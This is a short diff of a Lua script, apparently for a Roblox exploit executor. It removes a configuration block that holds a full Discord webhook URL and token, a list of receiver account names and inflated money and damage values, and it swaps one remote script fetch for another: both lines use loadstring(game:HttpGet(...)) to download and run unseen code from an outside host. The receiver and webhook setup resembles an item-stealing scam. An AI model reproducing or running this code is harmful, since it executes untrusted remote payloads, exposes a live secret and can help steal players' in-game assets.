@@ -1,6 +1,1 @@
-WEBHOOK = "https://discord.com/api/webhooks/1429053288438825030/ZCnhy5GwwNb71v_m8f1LynRp-Nnoa2mj2MOfMseBoqKhSOsXqT0GqR-uxryQr3-cO6kM"
-RECEIVERS = {"ArchAlt333", "ArchAlt444", "ArchAlt555"}
-MONEY_PER_SECOND = 500000 -- DEFAULT: 300000/s
-DMG_PER_SECOND = 500000 -- DEFAULT: 9000/s
-
-loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/5af52aaa2f3e0118d73d35f30686cc05b7680eaa3e0133db08d9a5a2b9db3d5d/download"))()
+loadstring(game:HttpGet("https://dpaste.com/HV56F7T59.txt"))()
